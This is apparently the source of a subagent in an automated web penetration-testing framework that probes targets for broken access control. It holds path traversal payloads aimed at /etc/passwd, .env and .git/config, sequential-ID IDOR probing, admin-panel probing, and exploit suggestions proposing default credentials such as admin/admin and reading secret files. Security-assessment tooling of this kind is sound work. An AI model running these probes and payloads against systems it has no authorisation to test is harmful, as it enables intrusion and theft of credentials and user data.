"""
broken_access_control_subagent.py — OWASP A01:2025 Broken Access Control detection.

Methodology:
  1. Path traversal detection with common payloads via curl
  2. IDOR discovery by testing sequential IDs on /api/user/, /profile/ endpoints
  3. Admin panel access check (401/403 vs 200/302 on /admin, /administrator, /manager etc.)
  4. Classify findings:
       HIGH     — confirmed path traversal, accessible admin panels
       MEDIUM   — IDOR candidates returning HTTP 200, protected admin paths (403)
       LOW      — redirected admin paths (301/302 requiring auth)
  5. Emit "broken_access_control_complete" with finding count
"""

from __future__ import annotations

import logging
import re
import time
from typing import Any

from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Patterns
# ---------------------------------------------------------------------------

_TRAVERSAL_CONFIRM_RE = re.compile(
    r"root:x|/bin/bash|/bin/sh|127\.0\.0\.1\s+localhost"
    r"|DB_PASSWORD|APP_KEY|SECRET_KEY|database_url"
    r"|<title>403 Forbidden|Index of /",
    re.IGNORECASE,
)

_IDOR_PATHS = [
    "/api/user/{id}",
    "/api/users/{id}",
    "/user/{id}",
    "/profile/{id}",
    "/account/{id}",
    "/order/{id}",
    "/invoice/{id}",
    "/document/{id}",
]

_ADMIN_PATHS = [
    "/admin",
    "/administrator",
    "/admin/login",
    "/wp-admin",
    "/manager",
    "/console",
    "/dashboard/admin",
    "/api/admin",
    "/backend",
    "/cpanel",
    "/.htaccess",
    "/phpmyadmin",
]

_TRAVERSAL_PAYLOADS = [
    "/..%2F..%2F..%2Fetc%2Fpasswd",
    "/%2e%2e/%2e%2e/etc/passwd",
    "/..%252F..%252Fetc%252Fpasswd",
    "/.env",
    "/.git/config",
    "/WEB-INF/web.xml",
]

_HTTP_STATUS_RE = re.compile(r"^(\d{3})\s*(.*)", re.MULTILINE)


# ---------------------------------------------------------------------------
# Subagent
# ---------------------------------------------------------------------------


class BrokenAccessControlSubagent(BaseSubagent):
    """
    Broken Access Control detection via path traversal, IDOR, and admin panel probing.
    """

    AGENT_NAME    = "web"
    SUBAGENT_NAME = "broken_access_control"

    async def run(  # noqa: C901
        self,
        target: str,
        web_targets: list[dict] | None = None,
        **kwargs: Any,
    ) -> SubagentResult:
        """
        Test for broken access control on all web targets.

        Parameters
        ----------
        target:
            Base host/IP.
        web_targets:
            List of URL dicts from web_fingerprint parsed_data["web_targets"].
            Falls back to http/https on target if not provided.

        Returns
        -------
        SubagentResult
            parsed_data["access_control_issues"] — list of detected issue dicts
        """
        result = SubagentResult(
            session_id=self.session_id,
            subagent_name=self.SUBAGENT_NAME,
            target=target,
        )
        result.parsed_data: dict = {"access_control_issues": []}
        wall_start = time.monotonic()

        # RAG lookup for relevant techniques
        await self._kb_search(
            f"IDOR broken access control path traversal {target}", top_k=3
        )

        # Build URL list
        urls: list[str] = []
        if web_targets:
            urls = [wt["url"] for wt in web_targets if isinstance(wt, dict) and "url" in wt]
        if not urls:
            urls = [f"http://{target}", f"https://{target}"]

        issues: list[dict] = []

        for url in urls:
            base = url.rstrip("/")

            # ── Test 1: Path traversal ─────────────────────────────────────
            logger.info("[broken_access_control] path traversal on %s", url)
            for payload in _TRAVERSAL_PAYLOADS:
                test_url = base + payload
                try:
                    trav_out = await self.collect_tool(
                        "curl",
                        target,
                        {
                            "options": (
                                f"-s -L -m 10 --max-redirs 2 "
                                f"-H 'User-Agent: Mozilla/5.0' "
                                f"\"{test_url}\""
                            )
                        },
                    )
                    self._tool_outputs[f"traversal_{payload[:30]}"] = trav_out

                    if _TRAVERSAL_CONFIRM_RE.search(trav_out):
                        issues.append({
                            "type": "path_traversal",
                            "url": test_url,
                            "payload": payload,
                        })
                        await self.store_finding(Finding(
                            title=f"Path Traversal Confirmed: {payload}",
                            description=(
                                f"Path traversal payload '{payload}' returned sensitive content "
                                f"at {test_url}. An attacker can read arbitrary server files."
                            ),
                            severity="HIGH",
                            evidence=trav_out[:600],
                            tool="curl",
                            host=target,
                            port=_port_from_url(url),
                            mitre_technique="T1083",
                            exploit_suggestion=(
                                f"curl -s \"{base}/../../../etc/passwd\" "
                                f"or \"{base}/.env\" to read credentials and secrets."
                            ),
                        ))

                except Exception as exc:
                    logger.warning("[broken_access_control] traversal error %s: %s", test_url, exc)

            # ── Test 2: IDOR — sequential ID probing ───────────────────────
            logger.info("[broken_access_control] IDOR probe on %s", url)
            for path_tmpl in _IDOR_PATHS[:5]:
                for obj_id in (1, 2, 3):
                    test_url = base + path_tmpl.format(id=obj_id)
                    try:
                        idor_out = await self.collect_tool(
                            "curl",
                            target,
                            {
                                "options": (
                                    f"-s -o /dev/null -w '%{{http_code}}' "
                                    f"-m 5 \"{test_url}\""
                                )
                            },
                        )
                        self._tool_outputs[f"idor_{path_tmpl[:20]}_{obj_id}"] = idor_out

                        code_str = idor_out.strip()
                        if code_str.isdigit() and int(code_str) == 200:
                            issue = {
                                "type": "idor_candidate",
                                "url": test_url,
                                "status": 200,
                            }
                            issues.append(issue)
                            await self.store_finding(Finding(
                                title=f"Potential IDOR: {path_tmpl.format(id=obj_id)} [200]",
                                description=(
                                    f"Endpoint {test_url} returns HTTP 200 without apparent "
                                    f"authorization check. Test with different user IDs to "
                                    f"verify cross-account data access."
                                ),
                                severity="MEDIUM",
                                evidence=f"HTTP 200 on {test_url}",
                                tool="curl",
                                host=target,
                                port=_port_from_url(url),
                                mitre_technique="T1078",
                                exploit_suggestion=(
                                    f"Enumerate IDs: for i in $(seq 1 100); do "
                                    f"curl -s \"{base}{path_tmpl.format(id='$i')}\"; done"
                                ),
                            ))
                            break  # only one finding per path template

                    except Exception as exc:
                        logger.warning("[broken_access_control] IDOR error %s: %s", test_url, exc)

            # ── Test 3: Admin panel access ─────────────────────────────────
            logger.info("[broken_access_control] admin panel probe on %s", url)
            admin_urls = " ".join(f'"{base}{p}"' for p in _ADMIN_PATHS)
            try:
                admin_out = await self.collect_tool(
                    "curl",
                    target,
                    {
                        "options": (
                            f"-s -o /dev/null "
                            f"-w '%{{http_code}} %{{url_effective}}\n' "
                            f"-L -m 8 --max-redirs 2 {admin_urls}"
                        )
                    },
                )
                self._tool_outputs[f"admin_probe_{base[-20:]}"] = admin_out

                for line in admin_out.splitlines():
                    parts = line.strip().split()
                    if len(parts) < 2:
                        continue
                    code_str, ep = parts[0], parts[1]
                    if not code_str.isdigit():
                        continue
                    code = int(code_str)
                    if code not in (200, 301, 302, 403):
                        continue

                    sev = "HIGH" if code == 200 else ("MEDIUM" if code in (301, 302) else "LOW")
                    label = {200: "Accessible", 301: "Redirect", 302: "Redirect", 403: "Forbidden"}
                    issues.append({
                        "type": "admin_panel",
                        "url": ep,
                        "status": code,
                    })
                    await self.store_finding(Finding(
                        title=f"Admin Panel {label.get(code, '')} (HTTP {code}): {ep}",
                        description=(
                            f"Admin endpoint {ep} returned HTTP {code}. "
                            + ("Directly accessible without authentication." if code == 200
                               else "Accessible after redirect — verify auth is enforced." if code in (301, 302)
                               else "Access forbidden, but endpoint exists — try auth bypass.")
                        ),
                        severity=sev,
                        evidence=f"HTTP {code} on {ep}",
                        tool="curl",
                        host=target,
                        port=_port_from_url(url),
                        mitre_technique="T1078",
                        exploit_suggestion=(
                            "Test default credentials: admin/admin, admin/password, admin/123456. "
                            "Try 'Authorization: Basic YWRtaW46YWRtaW4=' header bypass."
                        ),
                    ))

            except Exception as exc:
                logger.warning("[broken_access_control] admin probe error for %s: %s", url, exc)

        result.parsed_data["access_control_issues"] = issues
        result.findings                              = self._findings
        result.tool_outputs                          = self._tool_outputs
        result.duration_seconds                      = time.monotonic() - wall_start

        await self._emit(
            "broken_access_control_complete",
            {
                "target":           target,
                "issue_count":      len(issues),
                "finding_count":    len(self._findings),
                "duration_seconds": round(result.duration_seconds, 2),
            },
        )

        logger.info(
            "[broken_access_control] complete — %d issues, %d findings, %.1fs",
            len(issues), len(self._findings), result.duration_seconds,
        )
        return result


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _port_from_url(url: str) -> int | None:
    m = re.search(r":(\d+)(?:/|$)", url)
    if m:
        return int(m.group(1))
    if url.startswith("https://"):
        return 443
    if url.startswith("http://"):
        return 80
    return None
